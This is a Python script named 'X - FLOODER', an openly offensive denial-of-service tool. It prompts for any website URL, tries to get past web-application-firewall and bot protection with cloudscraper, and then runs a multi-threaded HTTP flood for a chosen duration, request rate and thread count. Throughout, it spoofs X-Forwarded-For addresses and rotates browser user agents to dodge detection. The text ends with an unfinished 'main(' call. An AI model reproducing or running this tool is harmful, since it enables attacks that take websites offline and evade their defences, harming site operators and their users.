import pyfiglet
import colorama
import random
import threading
import time
import requests
from colorama import Fore
import cloudscraper

scraper = cloudscraper.create_scraper()

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:98.0) Gecko/20100101 Firefox/98.0',
    'Opera/9.80 (Windows NT 6.2; WOW64) Presto/2.12.388 Version/12.18'
]

ip_prefixes = [
    '192.0.2.',
    '198.51.100.',
    '203.0.113.',
    '10.0.0.',
    '172.16.0.',
    '192.168.0.',
    '128.0.0.',
    '169.254.0.',
    '198.18.0.',
    '198.19.0.',
    '192.88.99.',
    '224.0.0.',
    '240.0.0.',
    '255.255.255.'
]

def send_http_request(url, user_agent, ip, timeout=5, max_retries=3):
    retries = 0
    while retries < max_retries:
        try:
            headers = {
                'User-Agent': user_agent,
                'X-Forwarded-For': ip,
                'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.google.com/',
                'Connection': 'keep-alive',
            }
            response = scraper.get(url, headers=headers, timeout=timeout)
            if response.status_code == 200:
                print(Fore.MAGENTA + f"Sent request to {url} from {ip}")
                return
            else:
                print(Fore.RED + f"Received unexpected status code {response.status_code} from {url}")
        except requests.RequestException as e:
            print(Fore.RED + f"Error sending request to {url}: {e}")
        except TimeoutError as e:
            print(Fore.RED + f"Timeout sending request to {url}: {e}")
        except Exception as e:
            print(Fore.RED + f"Unhandled exception: {e}")

        retries += 1
        print(Fore.YELLOW + f"Retrying ({retries}/{max_retries})...")
        time.sleep(2)  # Wait for 2 seconds before retrying

    print(Fore.RED + f"Failed to send request to {url} after {max_retries} retries")

def http_flood(url, duration, threads, rps):
    total_requests = duration * rps
    start_time = time.time()

    def thread_func():
        nonlocal total_requests
        while total_requests > 0:
            ip = random.choice(ip_prefixes) + '.'.join(str(random.randint(0, 255)) for _ in range(2))
            user_agent = random.choice(user_agents)
            send_http_request(url, user_agent, ip)
            total_requests -= 1
            time.sleep(random.uniform(0.5, 3))  # Add random delay between 0.5 to 3 seconds

    thread_list = []
    for _ in range(threads):
        thread = threading.Thread(target=thread_func)
        thread.start()
        thread_list.append(thread)

    for thread in thread_list:
        thread.join()

    end_time = time.time()
    print(Fore.YELLOW + f"HTTP flood attack finished in {end_time - start_time} seconds")

    # Flood the server with remaining requests using single-threaded approach
    flood_server(url, total_requests)

def flood_server(url, num_requests):
    for _ in range(num_requests):
        ip = random.choice(ip_prefixes) + '.'.join(str(random.randint(0, 255)) for _ in range(2))
        user_agent = random.choice(user_agents)
        send_http_request(url, user_agent, ip)

def bypass_waf(url, user_agent, ip):
    scraper = cloudscraper.create_scraper()
    headers = {
        'User-Agent': user_agent,
        'X-Forwarded-For': ip
    }
    try:
        response = scraper.get(url, headers=headers)
        return response
    except requests.RequestException as e:
        print(Fore.RED + f"Error sending request to {url}: {e}")
    except Exception as e:
        print(Fore.RED + f"Unhandled exception: {e}")
    return None

def main():
    print(Fore.RED + pyfiglet.figlet_format("X - FLOODER"))
    print(Fore.YELLOW + "Please enter the website URL:")
    url = input().strip()
    ip = random.choice(ip_prefixes) + '.'.join(str(random.randint(0, 255)) for _ in range(2))
    user_agent = random.choice(user_agents)
    
    print(Fore.CYAN + "Testing WAF bypass...")
    response = bypass_waf(url, user_agent, ip)
    
    if response and response.status_code == 200:
        print(Fore.GREEN + f"WAF bypass successful for {url} using IP {ip} and User-Agent {user_agent}")
    elif response:
        print(Fore.RED + f"WAF bypass failed. Received status code {response.status_code} from {url}")
    else:
        print(Fore.RED + f"WAF bypass failed. No response received from {url}")

    print(Fore.YELLOW + "\nNow, let's proceed with the HTTP flood attack...")
    print(Fore.YELLOW + "Please enter the duration (seconds):")
    duration = int(input())
    print(Fore.YELLOW + "Please enter the RPS (requests per second):")
    rps = int(input())
    print(Fore.YELLOW + "Please enter the number of threads:")
    threads = int(input())
    
    print(Fore.CYAN + "Starting HTTP flood attack...")
    http_flood(url, duration, threads, rps)

if __name__ == "__main__":
    main(
